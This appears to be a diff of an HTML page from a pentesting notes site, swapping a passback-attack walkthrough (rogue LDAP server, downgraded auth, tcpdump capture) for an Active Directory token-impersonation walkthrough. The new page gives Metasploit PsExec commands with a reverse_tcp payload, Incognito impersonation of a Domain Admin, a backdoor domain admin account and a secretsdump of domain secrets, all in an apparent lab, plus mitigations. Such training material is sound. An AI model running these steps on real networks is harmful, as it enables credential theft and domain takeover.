@@ -8,7 +8,7 @@
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="viewport" content="width=device-width, initial-scale=1" />
 
-    <title>Passback Attacks &#8212; MyHackBook</title>
+    <title>Token Impersonation &#8212; MyHackBook</title>
   
   
   
@@ -40,11 +40,11 @@
     <script src="../../../_static/doctools.js?v=888ff710"></script>
     <script src="../../../_static/sphinx_highlight.js?v=4825356b"></script>
     <script src="../../../_static/scripts/sphinx-book-theme.js?v=887ef09a"></script>
-    <script>DOCUMENTATION_OPTIONS.pagename = 'Active Directory/attacking-ad/initial-attack-vectors/passback-attacks';</script>
+    <script>DOCUMENTATION_OPTIONS.pagename = 'Active Directory/attacking-ad/post-compromise-attacks/token-impersonation';</script>
     <link rel="index" title="Index" href="../../../genindex.html" />
     <link rel="search" title="Search" href="../../../search.html" />
-    <link rel="next" title="Enumeration" href="../enumeration/index.html" />
-    <link rel="prev" title="IPv6 Attacks" href="ipv6-attacks.html" />
+    <link rel="next" title="Web App Pentesting" href="../../../Web%20App%20Pentesting/index.html" />
+    <link rel="prev" title="Kerberoasting" href="kerberoasting.html" />
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <meta name="docsearch:language" content="en"/>
   </head>
@@ -160,11 +160,11 @@
 <li class="toctree-l1 current active has-children"><a class="reference internal" href="../../index.html">Active Directory</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
 <li class="toctree-l2"><a class="reference internal" href="../../basics.html">Basics</a></li>
 <li class="toctree-l2 current active has-children"><a class="reference internal" href="../index.html">Attacking AD</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
-<li class="toctree-l3 current active has-children"><a class="reference internal" href="index.html">Initial Attack Vectors</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
-<li class="toctree-l4"><a class="reference internal" href="llmnr-poisoning.html">LLMNR Poisoning</a></li>
-<li class="toctree-l4"><a class="reference internal" href="smb-relay.html">SMB Relay</a></li>
-<li class="toctree-l4"><a class="reference internal" href="ipv6-attacks.html">IPv6 Attacks</a></li>
-<li class="toctree-l4 current active"><a class="current reference internal" href="#">Passback Attacks</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../initial-attack-vectors/index.html">Initial Attack Vectors</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
+<li class="toctree-l4"><a class="reference internal" href="../initial-attack-vectors/llmnr-poisoning.html">LLMNR Poisoning</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../initial-attack-vectors/smb-relay.html">SMB Relay</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../initial-attack-vectors/ipv6-attacks.html">IPv6 Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../initial-attack-vectors/passback-attacks.html">Passback Attacks</a></li>
 </ul>
 </details></li>
 <li class="toctree-l3 has-children"><a class="reference internal" href="../enumeration/index.html">Enumeration</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
@@ -174,11 +174,11 @@
 <li class="toctree-l4"><a class="reference internal" href="../enumeration/enumeration-with-bloodhound.html">Enumeration with Bloodhound</a></li>
 </ul>
 </details></li>
-<li class="toctree-l3 has-children"><a class="reference internal" href="../post-compromise-attacks/index.html">Post Compromise Attacks</a><details><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul>
-<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/pass-attacks.html">Pass Attacks</a></li>
-<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/mimikatz.html">Pass Attacks with Mimikatz</a></li>
-<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/kerberoasting.html">Kerberoasting</a></li>
-<li class="toctree-l4"><a class="reference internal" href="../post-compromise-attacks/token-impersonation.html">Token Impersonation</a></li>
+<li class="toctree-l3 current active has-children"><a class="reference internal" href="index.html">Post Compromise Attacks</a><details open="open"><summary><span class="toctree-toggle" role="presentation"><i class="fa-solid fa-chevron-down"></i></span></summary><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="pass-attacks.html">Pass Attacks</a></li>
+<li class="toctree-l4"><a class="reference internal" href="mimikatz.html">Pass Attacks with Mimikatz</a></li>
+<li class="toctree-l4"><a class="reference internal" href="kerberoasting.html">Kerberoasting</a></li>
+<li class="toctree-l4 current active"><a class="current reference internal" href="#">Token Impersonation</a></li>
 </ul>
 </details></li>
 </ul>
@@ -261,7 +261,7 @@
       
       
       
-      <li><a href="../../../_sources/Active Directory/attacking-ad/initial-attack-vectors/passback-attacks.md" target="_blank"
+      <li><a href="../../../_sources/Active Directory/attacking-ad/post-compromise-attacks/token-impersonation.md" target="_blank"
    class="btn btn-sm btn-download-source-button dropdown-item"
    title="Download source file"
    data-bs-placement="left" data-bs-toggle="tooltip"
@@ -345,7 +345,7 @@ document.write(`
               
 
 <div id="jb-print-docs-body" class="onlyprint">
-    <h1>Passback Attacks</h1>
+    <h1>Token Impersonation</h1>
     <!-- Table of contents -->
     <div id="print-main-content">
         <div id="jb-print-toc">
@@ -355,14 +355,10 @@ document.write(`
             </div>
             <nav aria-label="Page">
                 <ul class="visible nav section-nav flex-column">
-<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#what-is-the-intended-functionality">What is the intended functionality?</a></li>
-<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#what-can-go-wrong-here">What can go wrong here?</a></li>
-<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-requirements">Attack requirements</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#what-can-go-wrong">What can go wrong?</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#requirements-to-impersonate">Requirements to Impersonate</a></li>
 <li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-walkthrough">Attack Walkthrough</a></li>
-<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a><ul class="nav section-nav flex-column">
-<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#references">References</a></li>
-</ul>
-</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a></li>
 </ul>
             </nav>
         </div>
@@ -374,74 +370,127 @@ document.write(`
 <div id="searchbox"></div>
                 <article class="bd-article">
                   
-  <section id="passback-attacks">
-<h1>Passback Attacks<a class="headerlink" href="#passback-attacks" title="Permalink to this heading">#</a></h1>
-<section id="what-is-the-intended-functionality">
-<h2>What is the intended functionality?<a class="headerlink" href="#what-is-the-intended-functionality" title="Permalink to this heading">#</a></h2>
-<p>Network devices such as printers, scanners, or other appliances use LDAP authentication to validate users or access Active Directory services. These devices store credentials and automatically authenticate to the LDAP server when a user interacts with them, for example, to print documents or allow secure network access. The intended functionality is to simplify management and enforce centralized authentication. The LDAP settings are usually accessible via the device’s web-based configuration page, which can be reached by connecting to the device’s IP address in a browser. Access typically requires administrative credentials, which are often left at default values like admin:admin.</p>
-</section>
-<section id="what-can-go-wrong-here">
-<h2>What can go wrong here?<a class="headerlink" href="#what-can-go-wrong-here" title="Permalink to this heading">#</a></h2>
-<p>If an attacker gains access to the device’s configuration page, they can modify LDAP parameters, such as changing the server IP to a rogue LDAP server under their control. The device will then transmit its stored credentials to the attacker, who can capture them in plaintext if insecure authentication methods are used.</p>
-</section>
-<section id="attack-requirements">
-<h2>Attack requirements<a class="headerlink" href="#attack-requirements" title="Permalink to this heading">#</a></h2>
+  <section id="token-impersonation">
+<h1>Token Impersonation<a class="headerlink" href="#token-impersonation" title="Permalink to this heading">#</a></h1>
 <ul class="simple">
-<li><p>Access to a network device’s configuration, typically via default credentials (admin:admin) or compromised accounts.</p></li>
-<li><p>Ability to modify LDAP parameters (e.g., IP/hostname of the LDAP server).</p></li>
-<li><p>Control over a rogue LDAP server that can accept insecure authentication methods (PLAIN/LOGIN).</p></li>
-<li><p>Internal network access so the device can reach the rogue server.</p></li>
+<li><p>The attacker has compromised a Windows host (via RCE, stolen creds, or lateral movement) and escalated to local administrator or SYSTEM privileges. The goal is to leverage Windows tokens left behind by logged-in users, especially privileged ones like Domain Admins, to impersonate them and escalate privileges across the domain.</p></li>
+<li><p>Windows uses access tokens to represent the security context of a process or user. A token defines what the account can access (files, services, network resources). When a user logs in, Windows creates a token that gets attached to their processes. If an attacker can steal or impersonate a token, they can act as that user.</p></li>
+</ul>
+<p><strong>Types of Tokens</strong></p>
+<ul class="simple">
+<li><p><strong>Delegation Tokens</strong>: created when a user logs in locally or via Remote Desktop. They can be used to authenticate to remote services.</p></li>
+<li><p><strong>Impersonation Tokens</strong>: created when a user accesses a resource remotely (e.g., via SMB). They are usually limited to local usage but can sometimes still be abused.</p></li>
+</ul>
+<section id="what-can-go-wrong">
+<h2>What can go wrong?<a class="headerlink" href="#what-can-go-wrong" title="Permalink to this heading">#</a></h2>
+<p>If a Domain Admin token exists on the compromised machine:</p>
+<ul class="simple">
+<li><p>The attacker can impersonate the Domain Admin, without ever stealing or cracking their password.</p></li>
+<li><p>This access allows:</p>
+<ul>
+<li><p>Dumping domain hashes.</p></li>
+<li><p>Running remote commands (e.g., creating a new backdoor domain account).</p></li>
+</ul>
+</li>
+</ul>
+<p><strong>Essentially, all that’s required is that the Domain Admin logged in once, and their token is still available.</strong></p>
+</section>
+<section id="requirements-to-impersonate">
+<h2>Requirements to Impersonate<a class="headerlink" href="#requirements-to-impersonate" title="Permalink to this heading">#</a></h2>
+<ul class="simple">
+<li><p>Attacker must already have administrator or SYSTEM privileges on the machine to manipulate tokens.</p></li>
+<li><p>A privileged user (like a Domain Admin) must have an active or cached token on the compromised system.</p></li>
 </ul>
 </section>
 <section id="attack-walkthrough">
 <h2>Attack Walkthrough<a class="headerlink" href="#attack-walkthrough" title="Permalink to this heading">#</a></h2>
-<ol class="arabic">
-<li><p>Gain access to the device configuration page</p></li>
-<li><p>Redirect the LDAP server to a rogue server</p>
-<ul class="simple">
-<li><p>Set the LDAP server IP in the device configuration to your attack machine.</p></li>
-<li><p>Start a simple listener (e.g., nc -lvp 389) to test connectivity.</p></li>
-<li><p>Note: A plain Netcat listener may fail to capture credentials if the device negotiates a secure authentication method.</p></li>
-</ul>
-</li>
-<li><p>Host and configure a rogue LDAP server</p>
-<ul>
-<li><p>Install OpenLDAP and configure it to match the target domain.</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">apt</span><span class="o">-</span><span class="n">get</span> <span class="n">install</span> <span class="n">slapd</span> <span class="n">ldap</span><span class="o">-</span><span class="n">utils</span>
-</pre></div>
-</div>
-</li>
-<li><p>Downgrade authentication mechanisms to allow insecure methods (PLAIN/LOGIN) by creating an LDIF file (weak.ldif) and applying it:</p>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">ldapmodify</span> <span class="o">-</span><span class="n">Y</span> <span class="n">EXTERNAL</span> <span class="o">-</span><span class="n">H</span> <span class="n">ldapi</span><span class="p">:</span><span class="o">//</span> <span class="o">-</span><span class="n">f</span> <span class="o">./</span><span class="n">weak</span><span class="o">.</span><span class="n">ldif</span>
-<span class="n">sudo</span> <span class="n">service</span> <span class="n">slapd</span> <span class="n">restart</span>
-</pre></div>
-</div>
-</li>
-</ul>
-</li>
-<li><p>Capture credentials</p>
-<ul class="simple">
-<li><p>The device now authenticates to your rogue LDAP server using the downgraded, insecure method.</p></li>
-<li><p>Capture credentials in plaintext using tcpdump or another network sniffer:</p></li>
-</ul>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">SX</span> <span class="o">-</span><span class="n">i</span> <span class="o">&lt;</span><span class="n">interface</span><span class="o">&gt;</span> <span class="n">tcp</span> <span class="n">port</span> <span class="mi">389</span>
-</pre></div>
-</div>
-</li>
+<ol class="arabic simple">
+<li><p>Gain Access</p></li>
 </ol>
+<p>Exploit a target system (example: THEPUNISHER) using valid creds with PsExec:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>msfconsole
+
+search psexec
+use exploit/windows/smb/exec
+
+set payload windows/x64/meterpreter/reverse_tcp
+set RHOSTS 10.0.2.16
+set SMBUser fcastle
+set SMBPass Password1!
+set SMBDomain MARVEL.local
+run
+</pre></div>
+</div>
+<ol class="arabic simple" start="2">
+<li><p>Load Incognito &amp; Enumerate Tokens</p></li>
+</ol>
+<p>(here I logged in with the domain admin account on THEPUNISHER machine to simulate the attack scenario we described)</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">load</span> <span class="n">incognito</span>
+<span class="n">list_tokens</span> <span class="o">-</span><span class="n">u</span>
+</pre></div>
+</div>
+<figure class="align-center" id="id1">
+<img alt="Enumerating Tokens via Incognito" src="../../../_images/token-imper1.png" />
+<figcaption>
+<p><span class="caption-text">Enumerating Tokens via Incognito</span><a class="headerlink" href="#id1" title="Permalink to this image">#</a></p>
+</figcaption>
+</figure>
+<ol class="arabic simple" start="3">
+<li><p>Impersonate a Token</p></li>
+</ol>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">impersonate_token</span> <span class="n">MARVEL</span>\\<span class="n">fcastle</span>
+<span class="n">shell</span>
+<span class="n">whoami</span>
+<span class="c1"># =&gt; marvel\fcastle</span>
+</pre></div>
+</div>
+<p>Revert back to our original token if needed:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">rev2self</span>
+<span class="n">whoami</span>
+<span class="c1"># =&gt; NT AUTHORITY\SYSTEM</span>
+</pre></div>
+</div>
+<p>Grab the admin token:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">impersonate_token</span> <span class="n">MARVEL</span>\\<span class="n">administrator</span>
+<span class="n">shell</span>
+<span class="n">whoami</span>
+<span class="c1"># =&gt; marvel\administrator</span>
+</pre></div>
+</div>
+<figure class="align-center" id="id2">
+<img alt="Impersonating Domain Admin" src="../../../_images/token-imper2.png" />
+<figcaption>
+<p><span class="caption-text">Impersonating Domain Admin</span><a class="headerlink" href="#id2" title="Permalink to this image">#</a></p>
+</figcaption>
+</figure>
+<p>Now we have full Domain Admin privileges.</p>
+<ol class="arabic simple" start="4">
+<li><p>Persistence via New Admin Account</p></li>
+</ol>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">net</span> <span class="n">user</span> <span class="o">/</span><span class="n">add</span> <span class="n">hawkeye</span> <span class="n">Password1</span><span class="o">@</span> <span class="o">/</span><span class="n">domain</span>
+<span class="n">net</span> <span class="n">group</span> <span class="s2">&quot;Domain Admins&quot;</span> <span class="n">hawkeye</span> <span class="o">/</span><span class="n">ADD</span> <span class="o">/</span><span class="n">DOMAIN</span>
+</pre></div>
+</div>
+<ol class="arabic simple" start="5">
+<li><p>Verify Priveleges</p></li>
+</ol>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">impacket</span><span class="o">-</span><span class="n">secretsdump</span> <span class="n">MARVEL</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">hawkeye</span><span class="p">:</span><span class="s1">&#39;Password1@&#39;</span><span class="o">@</span><span class="mf">10.0.2.18</span>
+</pre></div>
+</div>
+<figure class="align-center" id="id3">
+<img alt="Dumping Domain Secrets via new admin account" src="../../../_images/token-imper3.png" />
+<figcaption>
+<p><span class="caption-text">Dumping Domain Secrets via new admin account</span><a class="headerlink" href="#id3" title="Permalink to this image">#</a></p>
+</figcaption>
+</figure>
 </section>
 <section id="mitigations">
 <h2>Mitigations<a class="headerlink" href="#mitigations" title="Permalink to this heading">#</a></h2>
 <ul class="simple">
-<li><p>Change default passwords on all network devices and management interfaces.</p></li>
-<li><p>Enforce secure LDAP authentication (e.g., LDAPS, strong SASL mechanisms).</p></li>
+<li><p>Restrict Token Creation: limit which users/groups can create delegate/impersonation tokens.</p></li>
+<li><p>Account Tiering: Domain Admins should only log into Domain Controllers, never workstations/servers. Use separate accounts for daily tasks.</p></li>
+<li><p>Local Admin Restriction: minimize the number of local admins and apply LAPS (Local Administrator Password Solution) for unique passwords.</p></li>
 </ul>
-<section id="references">
-<h3>References<a class="headerlink" href="#references" title="Permalink to this heading">#</a></h3>
-<ul class="simple">
-<li><p><a class="reference external" href="https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack">https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack</a></p></li>
-</ul>
-</section>
 </section>
 </section>
 
@@ -457,20 +506,20 @@ document.write(`
                   
 <div class="prev-next-area">
     <a class="left-prev"
-       href="ipv6-attacks.html"
+       href="kerberoasting.html"
        title="previous page">
       <i class="fa-solid fa-angle-left"></i>
       <div class="prev-next-info">
         <p class="prev-next-subtitle">previous</p>
-        <p class="prev-next-title">IPv6 Attacks</p>
+        <p class="prev-next-title">Kerberoasting</p>
       </div>
     </a>
     <a class="right-next"
-       href="../enumeration/index.html"
+       href="../../../Web%20App%20Pentesting/index.html"
        title="next page">
       <div class="prev-next-info">
         <p class="prev-next-subtitle">next</p>
-        <p class="prev-next-title">Enumeration</p>
+        <p class="prev-next-title">Web App Pentesting</p>
       </div>
       <i class="fa-solid fa-angle-right"></i>
     </a>
@@ -490,14 +539,10 @@ document.write(`
   </div>
   <nav class="bd-toc-nav page-toc">
     <ul class="visible nav section-nav flex-column">
-<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#what-is-the-intended-functionality">What is the intended functionality?</a></li>
-<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#what-can-go-wrong-here">What can go wrong here?</a></li>
-<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-requirements">Attack requirements</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#what-can-go-wrong">What can go wrong?</a></li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#requirements-to-impersonate">Requirements to Impersonate</a></li>
 <li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-walkthrough">Attack Walkthrough</a></li>
-<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a><ul class="nav section-nav flex-column">
-<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#references">References</a></li>
-</ul>
-</li>
+<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#mitigations">Mitigations</a></li>
 </ul>
   </nav></div>
 
